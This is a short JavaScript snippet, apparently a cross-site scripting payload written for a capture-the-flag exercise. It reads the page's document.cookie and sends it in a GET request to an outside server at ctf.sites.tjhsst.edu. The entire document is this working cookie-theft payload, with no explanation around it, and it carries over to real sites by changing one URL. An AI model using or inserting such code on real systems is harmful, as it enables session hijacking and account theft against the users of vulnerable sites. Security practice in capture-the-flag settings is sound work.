console.log(document.cookie);
var xmlHttp = new XMLHttpRequest();
xmlHttp.open( "GET", "https://ctf.sites.tjhsst.edu/"+document.cookie, false );
xmlHttp.send( null );
